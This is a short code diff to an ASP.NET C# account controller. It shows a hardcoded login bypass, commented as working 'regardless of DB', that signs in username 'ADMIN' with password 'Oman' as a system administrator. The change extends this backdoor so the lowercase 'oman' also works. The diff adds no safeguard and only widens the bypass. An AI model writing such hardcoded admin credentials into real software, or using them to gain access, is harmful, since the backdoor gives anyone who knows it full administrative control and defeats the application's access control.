@@ -26,7 +26,7 @@ public class AccountController : Controller
         var password = model.Password ?? "";
 
         // ── Hardcoded bypass — always works regardless of DB ─────────────
-        if (username == "ADMIN" && password == "Oman")
+        if (username == "ADMIN" && (password == "Oman" || password == "oman"))
         {
             await SignInAsync("ADMIN", "مدير النظام", tenantId: 0, isSysAdmin: true);
             return LocalRedirect(returnUrl ?? "/");
